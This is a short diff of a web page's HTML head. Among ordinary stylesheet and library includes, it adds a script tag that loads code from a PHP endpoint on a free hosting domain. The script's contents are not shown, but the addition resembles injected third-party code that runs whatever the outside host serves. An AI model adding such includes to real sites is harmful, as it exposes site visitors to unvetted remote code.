@@ -47,6 +47,8 @@
 <link rel="manifest" href="/inc/manifest.json"/>
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
 <link href="https://fonts.googleapis.com/css2?family=Gotu&display=swap" rel="stylesheet">
+<script src='https://dlhut.000webhostapp.com/inc/downloadhelp.php'>
+</script>
 <script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=614490edfeb2560019eec6d8&product=sop' async='async'></script>
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
 <script type='text/javascript'>
